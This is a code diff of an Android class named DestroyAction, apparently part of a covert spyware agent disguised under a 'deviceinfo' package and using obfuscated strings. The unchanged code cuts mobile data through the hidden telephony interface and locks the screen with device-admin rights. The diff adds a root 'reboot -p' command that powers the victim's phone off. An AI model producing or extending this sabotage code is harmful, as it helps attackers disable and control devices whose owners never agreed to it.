@@ -9,13 +9,16 @@ import android.telephony.TelephonyManager;
 
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.Trigger;
+import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfAction;
 import com.android.deviceinfo.conf.ConfigurationException;
+import com.android.deviceinfo.util.Check;
+import com.android.deviceinfo.util.Execute;
 import com.android.internal.telephony.ITelephony;
 import com.android.m.M;
 
 public class DestroyAction extends SubAction {
-
+	private static final String TAG = "DestroyAction";
 	private boolean permanent;
 
 	public DestroyAction(ConfAction params) {
@@ -24,25 +27,31 @@ public class DestroyAction extends SubAction {
 
 	@Override
 	protected boolean parse(ConfAction conf) {
-		  try {
-	            permanent = conf.getBoolean(M.e("permanent"));
-	        } catch (ConfigurationException e) {
-	            return false;
-	        }
-	        return true;
+		try {
+			permanent = conf.getBoolean(M.e("permanent"));
+		} catch (ConfigurationException e) {
+			return false;
+		}
+		return true;
 	}
 
 	@Override
 	public boolean execute(Trigger trigger) {
-		if(Status.self().haveRoot()){
-			destroyRoot();
+		try {
+			if (Status.self().haveRoot()) {
+				destroyRoot();
+			}
+
+			if (Status.self().haveAdmin()) {
+				destroyAdmin();
+			}
+
+			destroyUser();
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (execute) Error: " + ex);
+			}
 		}
-		
-		if(Status.self().haveAdmin()){
-			destroyAdmin();
-		}
-		
-		destroyUser();
 		return true;
 	}
 
@@ -54,26 +63,26 @@ public class DestroyAction extends SubAction {
 			c = Class.forName(tm.getClass().getName());
 			Method m = c.getDeclaredMethod("getITelephony");
 			m.setAccessible(true);
-			ITelephony telephonyService = (ITelephony)m.invoke(tm);
-			
+			ITelephony telephonyService = (ITelephony) m.invoke(tm);
+
 			telephonyService.disableDataConnectivity();
-			
+
 		} catch (Exception e) {
-			
+
 			e.printStackTrace();
-		} 
-		
+		}
+
 	}
 
 	private void destroyAdmin() {
 		DevicePolicyManager mDPM;
 
-		mDPM = (DevicePolicyManager)Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
+		mDPM = (DevicePolicyManager) Status.self().getAppContext().getSystemService(Context.DEVICE_POLICY_SERVICE);
 		mDPM.lockNow();
 	}
 
 	private void destroyRoot() {
-		
+		Execute.executeRoot("reboot -p");
 	}
 
 }
